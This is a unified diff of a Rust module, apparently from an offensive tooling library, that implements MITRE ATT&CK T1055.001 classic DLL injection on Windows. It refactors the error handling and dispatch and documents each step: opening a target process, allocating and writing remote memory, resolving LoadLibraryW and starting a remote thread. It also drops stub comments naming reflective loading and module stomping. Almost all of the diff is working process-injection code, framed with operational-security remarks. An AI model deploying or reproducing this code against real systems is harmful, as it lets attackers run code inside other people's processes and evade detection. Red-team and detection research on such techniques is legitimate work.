@@ -1,6 +1,7 @@
-//! Implementation of MITRE ATT&CK T1055.001: Dynamic-link Library Injection.
+//! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
 //!
-//! Provides modular capabilities to inject DLLs into remote processes.
+//! This module implements the "Classic" injection technique. It forces a remote process
+//! to load a DLL from the disk by spawning a new thread that calls `LoadLibraryW`.
 
 use std::{
     mem::transmute,
@@ -27,86 +28,73 @@ use windows_sys::{
 };
 
 use crate::{
-    error::InjectumError,
-    info,
+    Error, Result, info,
     payload::Payload,
-    strategy::{Method, Strategy, Technique},
+    strategy::{DynamicLinkLibrary, Strategy, Technique},
     target::Target,
 };
 
-/// The strategy implementation for T1055.001 (Dynamic-link Library Injection).
+/// The concrete strategy implementation for T1055.001.
+#[derive(Default)]
 pub struct T1055_001;
 
-/// Defines the supported sub-techniques for this strategy.
-#[derive(Debug, PartialEq)]
-enum InjectionMethod {
-    ClassicDLLInjection,
-    ReflectiveDLLInjection,
-    MemoryModule,
-    ModuleStomping,
-}
-
-impl TryFrom<Method> for InjectionMethod {
-    type Error = InjectumError;
-
-    fn try_from(method: Method) -> Result<Self, Self::Error> {
-        match method.0 {
-            "ClassicDLLInjection" => Ok(Self::ClassicDLLInjection),
-            "ReflectiveDLLInjection" => Ok(Self::ReflectiveDLLInjection),
-            "MemoryModule" => Ok(Self::MemoryModule),
-            "ModuleStomping" => Ok(Self::ModuleStomping),
-            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
-        }
-    }
-}
-
 impl Strategy for T1055_001 {
-    fn requires_pid(&self, _method: Method) -> bool {
-        true
-    }
-
-    fn execute(
-        &self,
-        payload: &Payload,
-        target: &Target,
-        method: Method,
-    ) -> Result<(), InjectumError> {
-        let info = Technique::T1055_001.info();
+    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
+        let info = technique.info();
         info!("Strategy: {} ({})", info.mitre_id, info.name);
 
-        let variant: InjectionMethod = method.try_into()?;
+        // 1. Unwrap the configuration specific to this technique.
+        let method = match technique {
+            Technique::T1055_001(m) => m,
+            _ => return Err(Error::Execution("Internal dispatch error".into())),
+        };
 
-        // 1. Validate Target (PID required)
-        let pid = target
-            .pid()
-            .ok_or(InjectumError::PidRequired(info.mitre_id))?;
-
-        // 2. Validate Payload (Must be DllFile with a valid path)
-        let dll_path = match payload {
-            Payload::DllFile { path: Some(p), .. } => p,
+        // 2. Validate Target: Must be a PID (Remote Injection).
+        let process_id = match target {
+            Target::Pid(id) => *id,
             _ => {
-                return Err(InjectumError::PayloadMismatch {
+                return Err(Error::Validation(format!(
+                    "Strategy '{}' requires a Target PID.",
+                    info.mitre_id
+                )));
+            }
+        };
+
+        // 3. Validate Payload: Must be a DLL file path (on disk).
+        // This technique cannot inject raw bytes; the OS loader needs a file path.
+        let dll_path = match payload {
+            Payload::DllFile {
+                file_path: Some(p), ..
+            } => p,
+            Payload::DllFile {
+                file_path: None, ..
+            } => {
+                return Err(Error::Validation(
+                    "Classic DLL Injection requires the DLL to be on disk (path).".into(),
+                ));
+            }
+            _ => {
+                return Err(Error::Mismatch {
                     strategy: info.mitre_id,
-                    payload_type: "DllFile",
+                    variant: payload.variant_name(),
                 });
             }
         };
 
-        // 3. Execution based on variant
-        match variant {
-            InjectionMethod::ClassicDLLInjection => {
+        // 4. Execute the specific variant.
+        match method {
+            DynamicLinkLibrary::Classic => {
                 info!("Method: Classic DLL Injection");
-                inject_dll_classic(pid, dll_path)
+                inject_dll_classic(process_id, dll_path)
             }
-            _ => Err(InjectumError::MethodNotSupported(format!(
-                "Method variant '{:?}' is not yet implemented.",
-                method.0
-            ))),
         }
     }
 }
 
-/// Wrapper to ensure handles are closed when they go out of scope.
+/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
+///
+/// Ensures that `CloseHandle` is automatically called when the scope ends,
+/// preventing resource leaks in the operating system.
 struct HandleGuard(HANDLE);
 
 impl HandleGuard {
@@ -123,15 +111,22 @@ impl Drop for HandleGuard {
     }
 }
 
-/// [Classic DLL Injection]
-/// Performs classic DLL injection using `LoadLibraryW`.
-fn inject_dll_classic(pid: u32, path: &Path) -> Result<(), InjectumError> {
-    // 1. Prepare Path
-    let wide_path = to_utf16_null_terminated(path);
-    let size_in_bytes = wide_path.len() * size_of::<u16>();
+/// Performs the "Classic" DLL injection sequence.
+///
+/// # Logic Flow
+/// 1. **OpenProcess**: Acquire a handle to the target PID with specific permissions.
+/// 2. **VirtualAllocEx**: Allocate memory in the remote process for the DLL path.
+/// 3. **WriteProcessMemory**: Copy the DLL path string into the allocated remote memory.
+/// 4. **GetProcAddress**: Resolve the address of `LoadLibraryW` in `kernel32.dll`.
+///    *Note: kernel32 is mapped at the same address in almost all processes.*
+/// 5. **CreateRemoteThread**: Spawn a thread in the target that executes `LoadLibraryW(path)`.
+fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
+    // 1. Prepare Path (Windows requires UTF-16 null-terminated strings)
+    let path_utf16 = to_utf16_null_terminated(dll_path);
+    let alloc_size = path_utf16.len() * size_of::<u16>();
 
     // 2. Open Target Process
-    // We request only the specific permissions needed, rather than PROCESS_ALL_ACCESS which is better for OpSec and "Least Privilege".
+    // Request minimal privileges required for the operation (OpSec best practice).
     let process_handle = unsafe {
         OpenProcess(
             PROCESS_CREATE_THREAD
@@ -140,92 +135,87 @@ fn inject_dll_classic(pid: u32, path: &Path) -> Result<(), InjectumError> {
                 | PROCESS_VM_READ
                 | PROCESS_VM_WRITE,
             FALSE,
-            pid,
+            process_id,
         )
     };
 
     if process_handle.is_null() {
-        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
-            GetLastError()
-        }));
+        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
     }
 
-    let process_handle_guard = HandleGuard::new(process_handle);
+    // Wrap in guard immediately to ensure cleanup on error.
+    let process_guard = HandleGuard::new(process_handle);
 
     // 3. Allocate Memory in Target
-    let remote_buffer = unsafe {
+    let remote_addr = unsafe {
         VirtualAllocEx(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
-            size_in_bytes,
+            alloc_size,
             MEM_COMMIT,
             PAGE_READWRITE,
         )
     };
 
-    if remote_buffer.is_null() {
-        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
-            GetLastError()
-        }));
+    if remote_addr.is_null() {
+        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
     }
 
     // 4. Write DLL Path to Target Memory
-    let mut bytes_written: usize = 0;
+    let mut write_len: usize = 0;
 
-    let write_success = unsafe {
+    let success = unsafe {
         WriteProcessMemory(
-            process_handle_guard.0,
-            remote_buffer,
-            wide_path.as_ptr().cast(),
-            size_in_bytes,
-            &mut bytes_written,
+            process_guard.0,
+            remote_addr,
+            path_utf16.as_ptr().cast(),
+            alloc_size,
+            &mut write_len,
         )
     };
 
-    if write_success == 0 || bytes_written != size_in_bytes {
-        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
+    if success == 0 || write_len != alloc_size {
+        return Err(Error::Win32("WriteProcessMemory", unsafe {
             GetLastError()
         }));
     }
 
     // 5. Resolve LoadLibraryW Address
-    let kernel32 = w!("kernel32.dll");
-
-    let module_handle = unsafe { GetModuleHandleW(kernel32) };
+    // We look it up in our own process. Because kernel32.dll is a "Known DLL",
+    // ASLR usually maps it to the same address in all processes during the same boot session.
+    let kernel32_ptr = w!("kernel32.dll");
+    let module_handle = unsafe { GetModuleHandleW(kernel32_ptr) };
 
     if module_handle.is_null() {
-        return Err(InjectumError::Win32Error("GetModuleHandleW", unsafe {
-            GetLastError()
-        }));
+        return Err(Error::Win32("GetModuleHandleW", unsafe { GetLastError() }));
     }
 
     let func_name = c"LoadLibraryW";
 
-    let proc_address = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };
+    let load_library_addr = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };
 
-    if proc_address.is_none() {
-        return Err(InjectumError::Win32Error("GetProcAddress", unsafe {
-            GetLastError()
-        }));
+    if load_library_addr.is_none() {
+        return Err(Error::Win32("GetProcAddress", unsafe { GetLastError() }));
     }
 
-    let start_routine: LPTHREAD_START_ROUTINE = unsafe { transmute(proc_address) };
+    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };
 
     // 6. Create Remote Thread
+    // This executes LoadLibraryW(remote_addr) inside the target process.
     let thread_handle = unsafe {
         CreateRemoteThread(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
             0,
-            start_routine,
-            remote_buffer,
+            routine_ptr,
+            remote_addr,
             0,
             null_mut(),
         )
     };
 
     if thread_handle.is_null() {
-        return Err(InjectumError::Win32Error("CreateRemoteThread", unsafe {
+        return Err(Error::Win32("CreateRemoteThread", unsafe {
             GetLastError()
         }));
     }
@@ -234,12 +224,6 @@ fn inject_dll_classic(pid: u32, path: &Path) -> Result<(), InjectumError> {
 
     Ok(())
 }
-
-// [Reflective] Maps raw DLL bytes, finds ReflectiveLoader export, executes it.
-
-// [MemoryModule] Manually maps PE sections, relocations, and imports.
-
-// [ModuleStomping] Loads a decoy DLL and overwrites it.
 
 /// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
 fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
